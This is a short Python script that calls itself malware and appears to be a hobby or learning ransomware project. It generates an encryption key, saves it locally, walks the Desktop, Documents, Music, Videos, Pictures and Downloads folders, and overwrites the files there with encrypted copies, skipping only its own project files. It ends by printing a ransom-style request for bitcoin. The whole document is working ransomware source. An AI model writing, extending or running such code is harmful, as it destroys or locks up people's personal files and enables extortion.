import os 
from cryptography.fernet import Fernet

# Function that encrypts one file
def encrypt_file(file_path, key):
	print(f"Encrypting {file_path}...")
	with open(file_path, "rb") as thefile:
		contents = thefile.read()
		contents_encrypted = Fernet(key).encrypt(contents)
	with open(file_path, "wb") as thefile:
		thefile.write(contents_encrypted)
	print(f"Encryption of {file_path} complete.")

# Key generation (this will be used later in the decryption stage)
key = Fernet.generate_key()

with open("thekey.key","wb") as thekey:
	thekey.write(key)

# Making a list of directories I want to be encrypted. This is so that the malware does 
# not encrypt important files in directories that may prevent the pc from working
directories = ["Desktop", "Documents", "Music", "Videos", "Pictures", "Downloads"]

# traversing all directories and subdirectories 
for directory in directories:
	print(f"Encrypting files in {directory}...")
	for root, dirs, files in os.walk(directory):
		print(f"Root: {root}")
		print(f"Directories: {dirs}")
		print(f"Files: {files}")
		for file in files:
			try:
				print(f"Encrypting {file} in {root}...")
				# This is temporary. This is just to ensure that the important files do not get encrypted. 
				if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py" or file == "dryrun.py" or file == "README.md":	#if file  is encrypt.py the dont add
					continue
				# getting the full path of the file
				file_path = os.path.join(root, file)

				# function call to encrypt file
				encrypt_file(file_path, key)
			except Exception as e:
				print(f"Error during encryption of {file_path}: {e}")

print("Toss a bitcoin to your hacker O' owner of this pc!")
